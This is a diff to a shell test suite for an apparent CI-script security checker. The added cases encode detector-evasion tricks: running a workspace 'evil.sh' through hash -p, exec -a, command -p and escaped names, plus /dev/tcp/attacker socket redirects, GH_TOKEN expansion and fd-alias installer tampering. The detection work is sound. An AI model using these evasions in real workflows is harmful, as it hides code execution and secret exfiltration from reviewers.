@@ -437,5 +437,36 @@ t gh-host-assign 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS
 t coproc-bash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}coproc bash \"\${GITHUB_WORKSPACE}/evil.sh\""
 t coproc-named 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}coproc FOO cat /tmp/x"
 
+# --- command hash (Codex P1: hash -p evil innocent) ---
+t hash-p 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}hash -p \"\${GITHUB_WORKSPACE}/evil.sh\" innocent; innocent"
+t hash-query-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}hash -r"
+
+# --- wrapper options (Codex P1: exec -a hides bash) ---
+t peel-exec-a 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}exec -a harmless bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t peel-exec-dd 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}exec -- bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t peel-command-p 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}command -p bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t peel-command-v-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}command -v gh"
+t peel-time-p 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}time -p bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+
+# --- escaped/concatenated commands (Codex P1: ba\sh, c\url) ---
+t esc-bash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ba\\sh \"\${GITHUB_WORKSPACE}/evil.sh\""
+t esc-curl 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}c\\url https://evil/x"
+t esc-concat 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}b\"\"ash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t esc-concat-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\"ec\"\"ho\" hi"
+t esc-declare 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare \\s=\$GH_TOKEN; echo \"\$s\""
+
+# --- socket redirects (Codex P1: /dev/tcp) ---
+t socket-out 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo hi > /dev/tcp/attacker/443"
+t socket-rw 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}exec 3<>/dev/tcp/attacker/443"
+t socket-in 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat < /dev/tcp/attacker/443"
+t socket-udp 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo hi > /dev/udp/attacker/53"
+t socket-esc 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo hi > /d\\ev/tcp/attacker/443"
+t socket-quoted-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"/dev/tcp/attacker/443\""
+
+# --- fd aliases (Codex P1: exec 3<>tmp + /proc/self/fd/3) ---
+t toctou-fd 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}exec 3<>\"\${tmp_bin}\"${RS}$I${FS}got_sha=${FS}a${FS}cat evil > /proc/self/fd/3"
+t toctou-fd-dup 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}exec 3<>\"\${tmp_bin}\"${RS}$I${FS}got_sha=${FS}a${FS}cat evil >&3"
+t toctou-fd-stderr-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}a${FS}echo x 2>/dev/null"
+
 printf '\nhardening suite: %d passed, %d failed%s\n' "$pass" "$fail" "${fail_names:+ ($fail_names)}"
 [[ "$fail" -eq 0 ]]
